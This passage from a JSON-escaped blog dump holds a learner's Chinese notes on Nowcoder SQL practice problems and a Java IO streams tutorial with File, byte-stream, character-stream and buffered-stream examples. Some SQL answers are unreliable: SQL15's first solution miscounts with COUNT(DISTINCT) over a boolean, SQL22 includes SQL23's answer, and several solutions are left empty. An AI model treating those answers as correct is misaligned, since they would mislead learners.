BY start_time\nLIMIT 3\n```\n\n####  SQL8 删除记录（三）-truncate\n\n1.DROP TABLE　清除数据并且销毁表，是一种数据库定义语言(DDL Data Definition Language), 执行后不能撤销，被删除表格的关系，索引，权限等等都会被永久删除。\n\n2.TRUNCATE TABLE　只清除数据，保留表结构，列，权限，索引，视图，关系等等，相当于清零数据，是一种数据库定义语言(DDL Data Definition Language)，执行后不能撤销。\n\n3.DELETE TABLE　删除（符合某些条件的）数据，是一种数据操纵语言(DML Data Manipulation Language)，执行后可以撤销。\n\n题解：\n\n```sql\n# -- 清空表，并将自增主键设置为1\ntruncate table exam_record\n  \n# -- 清空表数据，自增主键不恢复\nDELETE FROM exam_record;\nALTER TABLE exam_record auto_increment = 1;\n```\n\n### 02-表与索引操作\n\n#### SQL9 创建一张新表\n\n题解：\n\n```sql\ncreate table user_info_vip(\n    id int(11) not null primary key auto_increment Comment \"自增ID\" ,\n    uid int(11) not null unique comment \"用户ID\",\n    nick_name varchar(64) comment \"昵称\",\n    achievement\tint(11) default 0 comment \"成就值\",\n    level int(11) comment \"用户等级\",\n    job\tvarchar(32) comment \"职业方向\",\n    register_time datetime default CURRENT_TIMESTAMP comment \"注册时间\"\n)character set utf8 collate utf8_general_ci engine innodb\n```\n\n#### SQL10 修改表\n\n题解：\n\n```sql\nalter table user_info\nadd school varchar(15) after `level`,\nchange job profession varchar(10),\nmodify achievement int(11) default 0\n```\n\n#### SQL11-删除表\n\n题解：\n\n```sql\nDROP TABLE IF EXISTS exam_record_2011,exam_record_2012,exam_record_2013,exam_record_2014\n```\n\n#### SQL12-创建索引\n\n索引创建：\n\n- 1.1 create方式创建索引：\n\n```sql\nCREATE [UNIQUE | FULLTEXT] INDEX 索引名 ON 表名 \n(column1[(length) [DESC|ASC]] [,column2,...]) -- 可以对多列建立组合索引 \n\n# UNIQUE -- 唯一索引\n# FULLTEXT -- 全文索引 \n# 不指定唯一索引或全文索引时默认为普通索引\n```\n\n- 1.2 alter方式创建索引：\n\n```sql\nALTER TABLE 表名 \nADD [UNIQUE | FULLTEXT] INDEX 索引名(column)`\n```\n\n索引删除\n\n- 2.1 drop方式删除索引：`DROP INDEX <索引名> ON <表名>`\n- 2.2 alter方式删除索引：`ALTER TABLE <表名> DROP INDEX <索引名>`\n\n索引使用：\n\n- 索引使用时满足最左前缀匹配原则，即对于组合索引(col1, col2)，在不考虑引擎优化时，条件必须是col1在前col2在后，或者只使用col1，索引才会生效；\n- 索引不包含有NULL值的列\n- 一个查询只使用一次索引，where中如果使用了索引，order by就不会使用\n- like做字段比较时只有前缀确定时才会使用索引\n- 在列上进行运算后不会使用索引，如year(start_time)<2020不会使用start_time上的索引\n\n题解1：\n\n```sql\nCREATE INDEX idx_duration ON examination_info(duration);\nCREATE UNIQUE INDEX uniq_idx_exam_id ON examination_info(exam_id);\nCREATE FULLTEXT INDEX full_idx_tag ON examination_info(tag);\n```\n\n题解2:\n\n```sql\n-- 唯一索引\nALTER TABLE examination_info\nADD UNIQUE INDEX uniq_idx_exam_id(exam_id);\n \n-- 全文索引\nALTER TABLE examination_info\nADD FULLTEXT INDEX full_idx_tag(tag);\n \n-- 普通索引\nALTER TABLE examination_info\nADD INDEX idx_duration(duration);\n```\n\n#### SQL13-删除索引\n\n删除\n\n- 1、drop方式删除索引：`DROP INDEX <索引名> ON <表名>`\n- 2、alter方式删除索引：`ALTER TABLE <表名> DROP INDEX <索引名>`\n\n题解1：\n\n```sql\nDROP INDEX uniq_idx_exam_id ON examination_info;\nDROP INDEX full_idx_tag ON examination_info;\n```\n\n题解2:\n\n```sql\nALTER TABLE examination_info DROP INDEX uniq_idx_exam_id;\nALTER TABLE examination_info DROP INDEX full_idx_tag;\n```\n\n### 03-聚合分组查询\n\n#### SQL14 SQL类别高难度试卷得分的截断平均值\n\n题解：\n\n```sql\nselect \n    tag,\n    difficulty,\n    round((sum(score)-(max(score)+min(score)))/(count(score)-2),1) clip_avg_score\nfrom examination_info t1\ninner join exam_record t2 \non t1.exam_id = t2.exam_id\nwhere tag = \"SQL\" and difficulty = \"hard\"\n```\n\n####  SQL15 统计作答次数\n\n题解1:\n\n```sql\nSELECT\n    COUNT(exam_id) AS total_pv,\n    COUNT(submit_time) AS complete_pv,\n    COUNT(DISTINCT exam_id AND score IS NOT NULL) AS complete_exam_cnt\nFROM exam_record\n```\n\n题解2：\n\n```sql\nSELECT\n    COUNT(exam_id) AS total_pv,\n    COUNT(submit_time) AS complete_pv,\n    COUNT(DISTINCT IF(score IS NOT NULL,exam_id,NULL)) AS complete_exam_cnt\nFROM exam_record\n```\n\n#### SQL16 得分不小于平均分的最低分\n\n题解1：聚合函数求出平均值，作为表中的一个筛选条件\n\n```sql\nselect min(t1.score) min_score_over_avg \nfrom exam_record t1\nleft join examination_info t2 on t1.exam_id = t2.exam_id\nwhere t2.tag = 'SQL' \nand t1.score >= (\n    select avg(t1.score) \n    from exam_record t1\n    left join examination_info t2 on t1.exam_id = t2.exam_id\n    where t2.tag = 'SQL');\n```\n\n题解2:用窗口函数直接求出avg，作为一列。然后score与avg比较\n\n```sql\nselect min(t.score) min_score_over_avg \nfrom (select t1.score,avg(t1.score) over() avg_score \n      from exam_record t1\n      left join examination_info t2 on t1.exam_id = t2.exam_id\n      where t2.tag = 'SQL' and t1.score is not null) as t\nwhere t.score >= t.avg_score; \n```\n\n#### SQL17 平均活跃天数和月活人数\n\n本题陷阱在于九月份有个用户同一天做了两种卷子，直接count统计活跃天数会多一天，即用户ID和做题日期submit_time要**同时去重**才能得出正确的活跃天数.\n\n题解：\n\n```sql\nselect \n    date_format(start_time,\"%Y%m\") as month,\n    round(count(distinct uid,date_format(submit_time,'%Y%m%d'))/count(distinct uid),2) as avg_active_days,\n    count(distinct uid) as mau\nfrom exam_record\nwhere year(submit_time) = 2021\ngroup by month\n```\n\n#### SQL18 月总刷题数和日均刷题数\n\nlast_day()函数：获取对应月的最后一天的日期\n\nday()函数：取出天数\n\n因为有多个 submit_time，所以再 avg() 取个值\n\n题解：\n\n```sql\nselect\n   date_format(submit_time,\"%Y%m\") as submit_month,\n   count(date_format(submit_time,\"%Y%m\")) as month_q_cnt,\n   round(count(submit_time)/avg(day(last_day(submit_time))),3) as avg_day_q_cnt\nfrom practice_record\nwhere year(submit_time) = 2021\ngroup by DATE_FORMAT(submit_time, \"%Y%m\")\nunion ALL\nSELECT '2021汇总' as submit_month,\ncount(question_id) month_q_cnt,\nround(count(id)/31,3) avg_day_q_cnt\nfrom practice_record\nwhere year(submit_time) = 2021\norder by submit_month;\n```\n\n#### SQL19 未完成试卷数大于1的有效用户\n\n- 对于每条作答tag，用:连接日期和tag：`concat_ws(':', date(start_time), tag)`\n- 对于一个人（组内）的多条作答，用 ; 连接去重后的作答记录：`group_concat(distinct concat_ws(':', date(start_time), tag) separator ';')`\n\n题解：\n\n```sql\nselect \n    uid,\n    (count(start_time) - count(submit_time)) as incomplete_cnt,\n    count(submit_time) as complete_cnt,\n    group_concat(distinct concat(date(start_time),':',tag) order by start_time asc separator ';') as detail\nfrom exam_record as t1\nleft join examination_info as t2\non t1.exam_id = t2.exam_id\nwhere year(start_time) = 2021\ngroup by t1.uid\nhaving complete_cnt>=1 and incomplete_cnt<5 and incomplete_cnt>1 \norder by incomplete_cnt desc\n```\n\n### 04-多表查询\n\n#### SQL20 月均完成试卷数不小于3的用户爱作答的类别\n\n- 筛选月均完成数不小于3的用户。知识点：\n  - 按用户分组 `group by uid`\n  - 统计当前用户完成试卷总数  `count(exam_id)`\n  - 统计该用户有完成试卷的月份数 `count(distinct DATE_FORMAT(start_time, \"%Y%m\"))`\n  - 分组后过滤 `having count(exam_id) / count(distinct DATE_FORMAT(start_time, \"%Y%m\")) >= 3`\n\n题解：\n\n```sql\nselect tag,count(tag) as tag_cnt\nfrom exam_record as t1\ninner join examination_info as t2\non t1.exam_id = t2.exam_id \nwhere uid in (\n    select uid\n    from exam_record\n    where submit_time is not null\n    group by uid\n    having count(exam_id) / count(distinct DATE_FORMAT(start_time, \"%Y%m\")) >= 3\n)\ngroup by tag\norder by tag_cnt desc\n```\n\n#### SQL21 试卷发布当天作答人数和平均分\n\n题解：\n\n```sql\nselect \n    t2.exam_id,\n    count(distinct t1.uid) as uv,\n    round(avg(score),1) as avg_score\nfrom user_info as t1\ninner join exam_record as t3 on t1.uid = t3.uid\ninner join examination_info as t2 on t2.exam_id = t3.exam_id\nwhere t1.level > 5 and t2.tag = \"SQL\" and date(submit_time) = date(release_time) and score is not null\nGROUP BY exam_id\norder by uv desc,avg_score\n```\n\n#### SQL22 作答试卷得分大于过80的人的用户等级分布\n\n题解1：\n\n- `select * from () t1 union select * from () t2`\n\n```sql\nselect level,count(level) as level_cnt\nfrom exam_record as t3\ninner join examination_info as t2\non t3.exam_id = t2.exam_id\ninner join user_info as t1\non t1.uid = t3.uid\nwhere tag = 'SQL' and score > 80\ngroup by level\norder by level_cnt desc\n```\n\n题解2:\n\n```sql\nselect exam_id as tid,count(distinct er.uid) as uv,count(exam_id) as pv\nfrom exam_record er \ngroup by exam_id\nunion all\nselect question_id as tid,count(distinct pr.uid) as uv,count(question_id) as pv\nfrom practice_record pr \ngroup by question_id\norder by left(tid,1) desc, uv desc,pv desc \n```\n\n#### SQL23 每个题目和每份试卷被作答的人数和次数\n\n题解：\n\n```sql\nselect * from\n(select exam_id as tid,\n       count(distinct uid) as uv,\n       count(*) as pv\nfrom exam_record\ngroup by exam_id\norder by uv desc, pv desc) as t1\nunion\nselect * from\n(select question_id as tid,\n       count(distinct uid) as uv,\n       count(*) as pv\nfrom practice_record\ngroup by question_id\norder by uv desc, pv desc) as t2\n```\n\n暂停刷题，后面再接着刷。。。\n\n#### SQL24 分别满足两个活动的人\n\n题解：\n\n```sql\n\n```\n\n#### SQL25 满足条件的用户的试卷完成数和题目练习数\n\n题解：\n\n```sql\n\n```\n\n#### SQL26 每个6/7级用户活跃情况\n\n题解：\n\n```sql\n\n```\n\n### 05-窗口函数\n\n#### SQL27 每类试卷得分前3名\n\n题解：\n\n```sql\n\n```\n\n#### SQL28 第二快/慢用时之差大于试卷时长一半的试卷\n\n题解：\n\n```sql\n\n```\n\n#### SQL29 连续两次作答试卷的最大时间窗\n\n题解：\n\n```sql\n\n```\n\n\n\n## 四、SQL真题篇\n\n- [x] 🌟进阶篇：39道题\n- [x] 🕸题目地址：[牛客网](https://www.nowcoder.com/exam/oj?tab=SQL篇&topicId=268)\n- [x] 🚩小简计划：预计一周写完\n- [x] 🎯开始时间：0x-0x\n- [x] 🎉结束时间：0x-0x\n\n\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["MySQL"],"categories":["SQL"]},{"title":"Java-IO流","url":"/posts/52970.html","content":"\n## 前言\n\n哈喽！大家好，我是小简。今天开始学习《Java-IO流》，此系列是我做的一个 “Java 从 0 到 1 ” 实验，给自己一年左右时间，按照我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html)，从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计一周更新完\n- [x] 🎯开始时间：02-27\n- [x] 🎉结束时间：03-03\n- [x] 🍀总结：用时 5 天，提前两天完成任务，继续下一个 🚩\n\n## IO流简介\n\n![](https://img.jwt1399.top/img/image-20220227144342066.png)\n\n- 流：数据在数据源(文件)和程序(内存)之间经历的路径\n- 输入流：数据从数据源(文件)到程序(内存)的路径\n- 输出流：数据从程序(内存)到数据源(文件)的路径\n### 流分类\n\n- 按操作数据单位不同分为\n  - 字节流(8 bit) --适合操作二进制文件\n  - 字符流(按字符) --适合操作文本文件\n- 按数据流的流向不同分为\n  - 输入流\n  - 输出流\n- 按流的角色的不同分为\n  - 节点流\n  - 处理流/包装流\n\n![](https://img.jwt1399.top/img/image-20220227154413607.png)\n\n### 体系图\n\n![](https://img.jwt1399.top/img/image-20220227154216330.png)\n\n\n\n\n## 文件操作\n\n### 创建文件\n\n- new File(String pathname) //根据路径构建一个File对象\n- new File(File parent. String child) //根据父目录文件+子路径构建\n- new File(String parent,String child) //根据父目录+子路径构建\n- createNewFile() //文件创建\n\n```java\nimport org.junit.Test;\nimport java.io.File;\nimport java.io.IOException;\n\npublic class FileCreate {\n  \n    //new File(String pathname) //根据路径构建一个File对象\n    @Test\n    public void create01(){\n        String pathname = \"/Users/jianjian/Downloads/test1.txt\";\n        File file = new File(pathname);\n        try {\n            file.createNewFile();\n            System.out.println(\"文件创建成功\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n  \n    //new File(File parent. String child) //根据父目录文件+子路径构建\n    @Test\n    public void create02(){\n        File parentFile = new File(\"/Users/jianjian/Downloads/\");\n        String fileName = \"test2.txt\";\n        File file = new File(parentFile, fileName);\n        try {\n            file.createNewFile();\n            System.out.println(\"文件创建成功\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n    }\n  \n    //new File(String parent,String child) //根据父目录+子路径构建\n    @Test\n    public void create03(){\n        String parentFile = \"/Users/jianjian/Downloads/\";\n        String fileName = \"test3.txt\";\n        File file = new File(parentFile, fileName);\n        try {\n            file.createNewFile();\n            System.out.println(\"文件创建成功\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n### 获取文件信息\n\n- getName() 文件名字\n- getAbsolutePath() 文件绝对路径\n- file.getParent() 文件父级目录\n- file.length() 文件大小(字节)\n- file.exists() 文件是否存在\n- file.isFile() 是不是一个文件\n- file.isDirectory() 是不是一个目录\n\n```java\nimport org.junit.Test;\nimport java.io.File;\n\npublic class FileInfomation {\n    //获取文件的信息\n    @Test\n    public void info() {\n        //先创建文件对象\n        File file = new File(\"/Users/jianjian/Downloads/test.txt\");\n        //调用相应的方法，得到对应信息\n        System.out.println(\"文件名字=\" + file.getName());\n        System.out.println(\"文件绝对路径=\" + file.getAbsolutePath());\n        System.out.println(\"文件父级目录=\" + file.getParent());\n        System.out.println(\"文件大小(字节)=\" + file.length());//中文字符3个字节，英文字符1个字节\n        System.out.println(\"文件是否存在=\" + file.exists());//T\n        System.out.println(\"是不是一个文件=\" + file.isFile());//T\n        System.out.println(\"是不是一个目录=\" + file.isDirectory());//F\n    }\n}\n```\n\n### 目录操作\n\n- mkdir()   创建一级目录\n\n- mkdirs()  创建多级目录\n\n- delete()    删除空目录或文件\n\n**实例：**\n\n1) 判断 /Users/jianjian/Downloads/test.txt 文件是否存在，如果存在就删除。\n2) 判断 /Users/jianjian/Downloads/test 目录是否存在，如果存在就提示已经存在，否则就创建。\n3) 判断 /Users/jianjian/Downloads/test/a/b  目录是否存在，如果存在就提示已经存在，否则就创建。\n\n```java\nimport org.junit.Test;\nimport java.io.File;\n\npublic class Directory_ {\n\n    //1) 判断 /Users/jianjian/Downloads/test.txt 文件是否存在如果存在就删除。\n    @Test\n    public void Q1(){\n        String fileName = \"/Users/jianjian/Downloads/test.txt\";\n        File file = new File(fileName);\n        if (file.exists()) {\n            System.out.println(file.getName()+\"文件存在\");\n            if (file.delete()) {\n                System.out.println(file.getName()+\"删除成功\");\n            }\n        } else {\n            System.out.println(file.getName()+\"文件不存在\");\n        }\n    }\n\n    //2) 判断 /Users/jianjian/Downloads/test 目录是否存在，如果存在就提示已经存在，否则就创建。\n    @Test\n    public void Q2(){\n        String fileName = \"/Users/jianjian/Downloads/test\";\n        File file = new File(fileName);\n        if (file.exists()) {\n            System.out.println(file.getName()+\"文件存在\");\n        } else{\n            System.out.println(file.getName()+\"文件不存在\");\n            if (file.mkdir()) {\n                System.out.println(file.getName()+\"文件创建成功\");\n            } else{\n                System.out.println(file.getName()+\"文件创建失败\");\n            }\n        }\n    }\n\n    //3) 判断 /Users/jianjian/Downloads/test/a/b  目录是否存在，如果存在就提示已经存在，否则就创建。\n    @Test\n    public void Q3(){\n        String fileName = \"/Users/jianjian/Downloads/test/a/b\";\n        File file = new File(fileName);\n        if (file.exists()) {\n            System.out.println(file.getName()+\"文件存在\");\n        } else{\n            System.out.println(file.getName()+\"文件不存在\");\n            if (file.mkdirs()) {\n                System.out.println(file.getName()+\"文件创建成功\");\n            } else{\n                System.out.println(file.getName()+\"文件创建失败\");\n            }\n        }\n    }\n}\n```\n\n## 字节流\n\n### FileInputStream\n\n- read()   //单字节读取\n- read(byte[] b)  //多字节读取\n\n请使用 FileInputStream 读取 hello.txt 文件，并将文件内容显示到控制台\n\n#### 单字节读取\n\n```java\nimport org.junit.Test;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class FileInputStream_ {\n    @Test\n    public void readFile01() {\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        int readData = 0;\n        FileInputStream fileInputStream = null;\n        try {\n            //创建FileInputStream 对象，用于读取文件\n            fileInputStream = new FileInputStream(filePath);\n            //从该输入流读取一个字节的数据。如果没有输入可用，此方法将阻止。\n            //如果返回-1 , 表示读取完毕\n            while ((readData = fileInputStream.read()) != -1) {\n                System.out.print((char) readData);//转成char 显示\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            //关闭文件流，释放资源.\n            try {\n                fileInputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n#### 多字节读取\n\n```java\nimport org.junit.Test;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class FileInputStream_ {\n    @Test\n    public void readFile02() {\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        int readLen = 0;\n        byte[] buf = new byte[8];//一次读取8个字节.\n        FileInputStream fileInputStream = null;\n        try {\n            //创建FileInputStream 对象，用于读取文件\n            fileInputStream = new FileInputStream(filePath);\n            //从该输入流读取最多b.length 字节的数据到字节数组。\n            //如果返回-1 , 表示读取完毕\n            //如果读取正常, 返回实际读取的字节数\n            while ((readLen = fileInputStream.read(buf)) != -1) {\n                System.out.print(new String(buf,0,readLen));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            //关闭文件流，释放资源.\n            try {\n                fileInputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n### FileOutputStream\n\n-  创建方式\n  - new FileOutputStream(filePath)  //当写入内容时，会覆盖原来的内容\n  - new FileOutputStream(filePath, true)  //当写入内容时，是追加到原来的内容后面\n- 写入方式\n  - write(byte[] b); //单字节写入\n  - write(byte[] b, int off, int len) //将 len字节从位于偏移量off 的指定字节数组写入此文件输出流\n\n例子1🌰：请使用 FileOutputStream 在 a.txt 文件中写入 “hello，world”， 如果文件不存在，会创建文件(注意：前提是目录已经存在)\n\n```java\npackage com.jwt.outputstream_;\n\nimport org.junit.Test;\n\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class FileOutputStream_ {\n\n    @Test\n    public void writeFile01(){\n        String filePath = \"/Users/jianjian/Downloads/a.txt\";\n        FileOutputStream fileOutputStream = null;\n        try {\n            fileOutputStream = new FileOutputStream(filePath);//覆盖\n            fileOutputStream.write('J');\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Test\n    public void writeFile02(){\n        String filePath = \"/Users/jianjian/Downloads/a.txt\";\n        FileOutputStream fileOutputStream = null;\n        String str = \"Hello,jwt\";\n        try {\n            fileOutputStream = new FileOutputStream(filePath,true);//追加\n            //str.getBytes() 可以把字符串-> 字节数组\n            fileOutputStream.write(str.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Test\n    public void writeFile03(){\n        String filePath = \"/Users/jianjian/Downloads/a.txt\";\n        FileOutputStream fileOutputStream = null;\n        String str = \"Hello,jwt\";\n        try {\n            fileOutputStream = new FileOutputStream(filePath);\n            fileOutputStream.write(str.getBytes(), 0, str.length());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n    }\n}\n```\n\n例子1🌰：编程完成图片的拷贝，将 /Users/jianjian/Downloads/a.jpg 拷贝到 /Users/jianjian/Downloads/test/a.jpg，即输入流和输出流同时使用\n\n```java\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class FileCopy {\n    public static void main(String[] args) {\n        String srcFilePath = \"/Users/jianjian/Downloads/a.jpeg\";\n        String destFilePath = \"/Users/jianjian/Downloads/test/a.jpeg\";\n        FileInputStream fileInputStream = null;\n        FileOutputStream fileOutputStream = null;\n        try {\n            fileInputStream = new FileInputStream(srcFilePath);\n            fileOutputStream = new FileOutputStream(destFilePath);\n            //定义一个字节数组,提高读取效果\n            byte[] buf = new byte[1024];\n            int readLen = 0;\n            while ((readLen = fileInputStream.read(buf)) != -1) {\n                //读取到后，就写入到文件通过fileOutputStream\n                //即，是一边读，一边写\n                fileOutputStream.write(buf, 0, readLen);//一定要使用这个方法\n            }\n            System.out.println(\"拷贝ok~\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                //关闭输入流和输出流，释放资源\n                if (fileInputStream != null) {\n                    fileInputStream.close();\n                }\n                if (fileOutputStream != null) {\n                    fileOutputStream.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n## 字符流\n\n### FileReader\n\n- new FileReader(File/String)\n- read()：每次读取单个字符，返回该字符，如果到文件末尾返回-1\n- read(char[])：批量读取多个字符到数组，返回读取到的字符数，如果到文件末尾返回-1\n- 相关API:\n  - new String(char[]):将char[]转换成String\n  - new String(char[],off,len):将char[]的指定部分转换成String\n\n例子🌰：使用 FileReader 从 hello.txt 读取内容，并显示\n\n```java\nimport org.junit.Test;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class FileReader_ {\n    /**\n     * 单个字符读取文件\n     */\n    @Test\n    public void readFile01() {\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        FileReader fileReader = null;\n        int data = 0;\n        try {\n            //创建FileReader 对象\n            fileReader = new FileReader(filePath);\n            //循环读取使用read, 单个字符读取\n            while ((data = fileReader.read()) != -1) {\n                System.out.print((char) data);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (fileReader != null) {\n                    fileReader.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    /**\n     * 字符数组读取文件\n     */\n    @Test\n    public void readFile02() {\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        FileReader fileReader = null;\n        int readLen = 0;\n        char[] buf = new char[8];\n        try {\n            //创建FileReader 对象\n            fileReader = new FileReader(filePath);\n            //循环读取使用read(buf), 返回的是实际读取到的字符数\n            //如果返回-1, 说明到文件结束\n            while ((readLen = fileReader.read(buf)) != -1) {\n                System.out.print(new String(buf, 0, readLen));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (fileReader != null) {\n                    fileReader.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n### FileWriter\n\n- 创建\n\n  - newFileWriter(File/String)：覆盖模式，相当于流的指针在首端\n\n  - new FileWriter(File/String,true)：追加模式，相当于流的指针在尾端\n\n- 写入\n\n  - write(int);写入单个宇符\n\n  - write(char[])：写入指定数组\n\n  - write(char[],off,len):写入指定数组的指定部分\n\n  - write (string)：写入整个字符串\n\n  - write(string,off,len):写入字符串的指定部分\n\n- 相关APl：\n  - String类：toCharArray:将String转换成char[]\n- 注意：FileWriter使用后，必须要关闭(close)或刷新(flush)，否则写入不到指定的文件！\n\n例子🌰：使用 FileWriter 将 “Hello,World” 写入到 hello.txt 文件中\n\n```java\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class FileWriter_ {\n    public static void main(String[] args) {\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        //创建FileWriter 对象\n        FileWriter fileWriter = null;\n        char[] chars = {'a', 'b', 'c'};\n        try {\n            fileWriter = new FileWriter(filePath);//默认是覆盖写入\n            // 1) write(int):写入单个字符\n            fileWriter.write('H');\n            // 2) write(char[]):写入指定数组\n            fileWriter.write(chars);\n            // 3) write(char[],off,len):写入指定数组的指定部分\n            fileWriter.write(\"加油啊小简\".toCharArray(), 0, 3);\n            // 4) write（string）：写入整个字符串\n            fileWriter.write(\" 你好啊~\");\n            // 5)write(string, off, len):写入字符串的指定部分\n            fileWriter.write(\"一起学Java\", 0, 2);\n        //在数据量大的情况下，可以使用循环操作.\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            //对于FileWriter , 一定要关闭流，或者flush 才能真正的把数据写入到文件\n            try {\n                //fileWriter.flush();\n                //关闭文件流，等价flush() + 关闭\n                fileWriter.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        System.out.println(\"程序结束...\");\n    }\n}\n```\n\n## 节点流&处理流\n\n- 节点流可以从一个特定的数据源读写数据，如FileReader、 FileWriter\n\n- 处理流(也叫包装流)是\"连接”在已存在的流(节点流或处理流)之上，为程序提供更为强大的读写功能，也更加灵活，如BufferedReader、BufferedWriter\n\n### 节点流和处理流一览图\n\n![](https://img.jwt1399.top/img/image-20220301205129667.png)\n\n### 节点流和处理流区别\n\n- 节点流是底层流/低级流，直接跟数据源相接。\n- 处理流对节点流进行包装，使用了修饰器设计模式，不会直接与数据源相连，既可以消除不同节点流的实现差异，也可以提供更方便的方法来完成输入输出。\n\n## 处理流之缓冲流\n\n### BufferedReader\n\n\n使用 BufferedReader 读取文本文件，并显示在控制台\n\n```java\nimport java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class BufferedReader_ {\n    public static void main(String[] args) throws IOException {\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        //创建bufferedReader\n        BufferedReader bufferedReader = new BufferedReader(new FileReader(filePath));\n        //读取\n        String line; //按行读取, 效率高\n        //1. bufferedReader.readLine() 是按行读取文件\n        //2. 当返回null 时，表示文件读取完毕\n        while ((line = bufferedReader.readLine()) != null) {\n            System.out.println(line);\n        }\n        //关闭流, 这里注意，只需要关闭BufferedReader ，因为底层会自动的去关闭节点流\n        bufferedReader.close();\n    }\n}\n```\n\n**关闭流时，只需要关闭外层流(处理流)即可，因为底层会自动的去关闭节点流**\n\n###  BufferedWriter\n\n使用 BufferedWriter 将 ”hello, World”，写入到文件中\n\n```java\npackage com.jwt.writer_;\n\nimport java.io.BufferedWriter;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class BufferedWriter_ {\n    public static void main(String[] args) throws IOException {\n        String filePath = \"/Users/jianjian/Downloads/hello.txt\";\n        BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(filePath,true));//以追加的方式写入\n        bufferedWriter.write(\"Hello,World\");\n        bufferedWriter.newLine();//插入一个和系统相关的换行\n        bufferedWriter.write(\"Hi,World\");\n        bufferedWriter.newLine();\n        //关闭外层流即可， 传入的new FileWriter(filePath) ,会在底层关闭\n        bufferedWriter.close();\n    }\n}\n```\n\n例子🌰：综合使用 BufferedReader 和 BufferedWriter 完成**文本文件**拷贝，注意文件编码\n\n- BufferedReader 和 BufferedWriter 是按照字符操作\n- 不要去操作二进制文件[声音，视频，doc, pdf ], 可能造成文件损坏\n\n```java\npackage com.jwt.writer_;\n\nimport java.io.*;\n\npublic class BufferedCopy_ {\n    public static void main(String[] args) {\n        String srcFilePath = \"/Users/jianjian/Downloads/hello.txt\";\n        String destFilePath = \"/Users/jianjian/Downloads/test/hello.txt\";\n        BufferedReader bufferedReader = null;\n        BufferedWriter bufferedWriter = null;\n        String data;\n        try {\n            bufferedReader = new BufferedReader(new FileReader(srcFilePath));\n            bufferedWriter = new BufferedWriter(new FileWriter(destFilePath));\n            //说明: readLine 读取一行内容，但是没有换行\n            while ((data=bufferedReader.readLine()) != null) {\n                //每读取一行，就写入\n                bufferedWriter.write(data);\n                //插入一个换行\n                bufferedWriter.newLine();\n            }\n            System.out.println(\"拷贝完毕...\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }finally {\n            try {\n                //关闭流\n                if (bufferedReader != null){\n                    bufferedReader.close();\n                }\n               if (bufferedWriter != null){\n                   bufferedWriter.close();\n               }\n\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n### BufferedInputStream & BufferedOutputStream\n\n- BufferedInputStream 是字节流，在创建 BufferedInputStream时，会创建一个内部缓冲区数组\n\n- BufferedOutputStream 是字节流，实现缓冲的输出流，可以将多个字节写入底层输出流中，而不必对每次字节写入调用底层系统\n\n例子🌰：编程完成**图片/音乐**的拷贝(要求使用Buffered..流)\n\n```java\npackage com.jwt.writer_;\n\nimport java.io.*;\n\npublic class BufferedCopy02 {\n    public static void main(String[] args) {\n        String srcFilePath = \"/Users/jianjian/Downloads/a.jpeg\";\n        String destFilePath = \"/Users/jianjian/Downloads/test/a.jpeg\";\n        BufferedInputStream bufferedInputStream = null;\n        BufferedOutputStream bufferedOutputStream = null;\n        int data;\n        try {\n            bufferedInputStream = new BufferedInputStream(new FileInputStream(srcFilePath));\n            bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(destFilePath));\n            